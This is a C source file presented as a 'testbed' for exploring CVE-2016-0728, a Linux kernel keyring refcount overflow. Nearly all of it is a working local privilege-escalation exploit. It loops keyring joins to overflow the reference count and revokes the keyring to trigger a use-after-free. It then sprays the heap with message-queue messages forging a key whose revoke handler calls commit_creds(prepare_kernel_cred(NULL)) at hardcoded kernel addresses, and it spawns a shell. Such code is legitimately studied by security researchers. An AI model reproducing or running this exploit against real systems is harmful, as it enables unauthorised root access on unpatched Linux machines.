/*
 * The "CVE-2016-0728 testbed", by jn.
 *
 * A small program to aid in exploring the keyctl refcount overflow bug that
 * can be exploited to get a use-after-free and code execution in ring 0.
 *
 * This code is loosely based on Perception Point's writeup[0] and PoC[1].
 *
 * [0]: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
 * [1]: https://gist.github.com/PerceptionPointTeam/18b1e86d1c0f8531ff8f
 *
 *
 * Copyright (C) 2016 Jonathan Neuschäfer
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#define _XOPEN_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <signal.h>
#include <stdint.h>
#include <stdbool.h>
#include <time.h>
#include <keyutils.h>
#include <unistd.h>
#include <errno.h>
#include "linux-types.h"

typedef unsigned char u_char;
#include <bsd/stdlib.h>

static char *parse_cmdline(int argc, char **argv);
static uint32_t join_keyring(const char *name, uint32_t serial);
static uint32_t auto_incref(const char *name, uint32_t serial);
static int32_t get_usage(uint32_t keyring);
static pid_t fork_child(void);
struct heap_helper;
static struct heap_helper *start_heap_helper(void);
static void spray_heap(struct heap_helper *heap);
static void destroy_heap_helper(struct heap_helper *heap);

int main(int argc, char **argv) {
	char *keyring_name = parse_cmdline(argc, argv);
	pid_t child_pid = -1;

	printf("Welcome to the CVE-2016-0728 testbed\n");
	printf("sizeof(struct msg_msg) == %#zx, sizeof(struct key) == %#zx",
			sizeof(struct msg_msg), sizeof(struct key));
	fflush(stdout);

	struct heap_helper *heap_helper = start_heap_helper();
	uint32_t keyring = join_keyring(keyring_name, 0);

	while (true) {
		printf("\n\n");
		printf("PID: %d, UID: (%d/%d)\n", getpid(), getuid(), geteuid());
		printf("Keyring: %08x, \"%s\"\n", keyring, keyring_name);
		printf("Usage:   %d\n", get_usage(keyring));
		if (child_pid != -1)
			printf("Child:   %d\n", child_pid);

		printf("Press a key: ");
		if (child_pid == -1)
			printf("(f)ork ");
		else
			printf("(k)ill ");
		printf("(i)ncref ");
		printf("(a)uto-incref ");
		printf("(r)evoke ");
		printf("(h)eap-spray ");
		printf("(s)hell ");
		printf("(q)uit ");

		const bool shitty_hack = true;
		switch (getchar()) {
		case 'f':
			if (child_pid == -1 || shitty_hack) {
				child_pid = fork_child();
				if (child_pid == -1)
					perror("fork");
			}
			break;
		case 'k':
			if (child_pid != -1) {
				kill(child_pid, SIGKILL);
				waitpid(child_pid, NULL, 0);
				child_pid = -1;
			}
			break;
		case 'i':
			keyring = join_keyring(keyring_name, keyring);
			break;
		case 'a':
			printf("Increfing...\n");
			keyring = auto_incref(keyring_name, keyring);
			break;
		case 'r':
			if (keyctl_revoke(KEY_SPEC_SESSION_KEYRING) == -1)
				perror("revoke failed");
			break;
		case 'h':
			spray_heap(heap_helper);
			break;
		case 's':
			destroy_heap_helper(heap_helper);
			execl("/bin/sh", "sh", NULL);
			perror("exec failed");
			exit(EXIT_FAILURE);
		case 'q':
			if (child_pid != -1) {
				kill(child_pid, SIGKILL);
				waitpid(child_pid, NULL, 0);
			}
			destroy_heap_helper(heap_helper);
			return EXIT_SUCCESS;
		}
	}
}

/* Parses the command line, returns the keyring name that should be used. */
static char *parse_cmdline(int argc, char **argv)
{
	if (argc == 2) {
		return argv[1];
	} else if (argc == 1) {
		char *name = malloc(16);
		snprintf(name, 16, "test-%08x", (unsigned int) arc4random());

		return name;
	} else {
		printf("Usage: %s [keyring name]\n", argv[0]);
		exit(EXIT_FAILURE);
	}
}

/* Automatically incref the keyring until its usage reaches -4 */
static uint32_t auto_incref(const char *name, uint32_t serial) {
	const uint32_t slack = 4;
	uint32_t usage = get_usage(serial);
	if (usage == 0) {
		// Try to guess a little better.
		usage = 1;
	}

	uint32_t delta = 0x80000000;
	while (usage >= -delta - slack) {
		printf("usage %08x, delta %08x\n", usage, delta);
		delta /= 2;
	}

	for (; usage < (uint32_t) -4; usage++) {
		if (usage >= -delta - slack) {
			printf("sleeping at %08x\n", usage);
			sleep(2);
			delta /= 2;
		}

		serial = join_keyring(name, serial);
	}

	return serial;
}

/* Join the current process to a keyring with the given name. The keyring's
 * serial number is returned. */
static uint32_t join_keyring(const char *name, uint32_t serial)
{
	key_serial_t ret = keyctl_join_session_keyring(name);

	if (ret == -1) {
		perror("BUG: keyctl_join_session_keyring returned -1");
		exit(EXIT_FAILURE);
	}

	if (ret != 0)
		serial = (uint32_t) ret;

	keyctl_setperm(serial, 0x3f3f0000);

	return serial;
}

/* Tries to read the keyring's usage from /proc/keys. */
static int32_t get_usage(uint32_t keyring) {
	FILE *f = fopen("/proc/keys", "r");

	if (!f) {
		static bool warned = false;
		if (!warned) {
			perror("Can't open /proc/keys");
			warned = true;
			return 0;
		}
	}

	while (!feof(f)) {
		uint32_t serial = 0;
		int32_t usage = 0;

		fscanf(f, "%08x %*[^ ] %d %*s %*x %*d %*d %*s%*s%*s", &serial, &usage);

		if (serial == keyring)
			return usage;
	}

	printf("Serial %08x not found in /proc/keys.\n", keyring);
	return 0;
}

/* Forks off a child process that waits until it is killed. */
static pid_t fork_child(void) {
	pid_t pid = fork();

	switch(pid) {
	case 0: /* child */
		pause();
		exit(EXIT_SUCCESS);
	case -1: /* error */
		perror("fork");
		exit(EXIT_FAILURE);
	default: /* parent */
		return pid;
	}
}

/* A proxy object that can spray the heap. */
struct heap_helper {
	int trigger_pipe;
	pid_t pid;
};

/* Waits for a byte of data to appear in the given pipe, and reads it. */
void wait_for_pipe(int pipe) {
retry:;
	char dummy;
	int res = read(pipe, &dummy, 1);
	if (res == -1) {
		if (errno == EAGAIN || errno == EINTR
				|| errno == EWOULDBLOCK) {
			goto retry;
		} else {
			perror("read (heap spray trigger pipe)");
			exit(EXIT_FAILURE);
		}
	}
}

struct cred;
int          (*commit_creds)(struct cred *cred) = (void *) 0xffffffff8106f950;
struct cred *(*prepare_kernel_cred)(void *null) = (void *) 0xffffffff8106fce0;

static void payload(struct key *key) {
	commit_creds(prepare_kernel_cred(NULL));
}

static struct key_type key_type_pwnage = {
	.name = "lol",
	.revoke = payload,
};

/* Heap spray worker function. */
void heap_helper_worker(int trigger) {
	wait_for_pipe(trigger);

	struct key key;
	memset(&key, 0, sizeof key);

	key.uid = getuid();
	key.type = &key_type_pwnage;
	key.flags = 1;
	key.perm = 0x3f3f0000;

	/* The heap spray. 64 messages in one message queue. */

	int mq = msgget(IPC_PRIVATE, 0600|IPC_CREAT);
	if (mq == -1) {
		perror("msgget (heap spray)");
		return;
	}

	struct {
		long mtype;
		char data[sizeof(struct key) - sizeof(struct msg_msg)];
	} buf = {
		.mtype = 0x0102030405060708,
		.data = {}
	};
	memcpy(buf.data, ((char *)&key) + sizeof(struct msg_msg),
			sizeof(buf.data));

	for (int i = 0; i < 64; i++) {
		int ret = msgsnd(mq, &buf, sizeof(buf.data), 0);
		if (ret == -1) {
			perror("msgsnd");
		}
	}
}

/* Starts the heap (spray) helper process.
 * Must be called before joining a session keyring, to avoid
 * unintended refcount changes due to fork() calls. */
struct heap_helper *start_heap_helper(void) {
	struct heap_helper *me = malloc(sizeof(*me));
	memset(me, 0, sizeof(*me));

	int pipes[2];
	if (pipe(pipes) == -1) {
		perror("pipe");
		exit(EXIT_FAILURE);
	}

	me->trigger_pipe = pipes[1];

	me->pid = fork();
	switch(me->pid) {
	case 0: /* child */
		heap_helper_worker(pipes[0]);
		exit(EXIT_SUCCESS);
	case -1: /* error */
		perror("fork");
		exit(EXIT_FAILURE);
	}

	return me;
}

/* Trigger the heap spraying. See heap_helper_worker for more information. */
static void spray_heap(struct heap_helper *heap) {
	write(heap->trigger_pipe, ".", 1);
}

static void destroy_heap_helper(struct heap_helper *heap) {
	close(heap->trigger_pipe);
	kill(heap->pid, SIGTERM);
	waitpid(heap->pid, NULL, 0);
	free(heap);
}
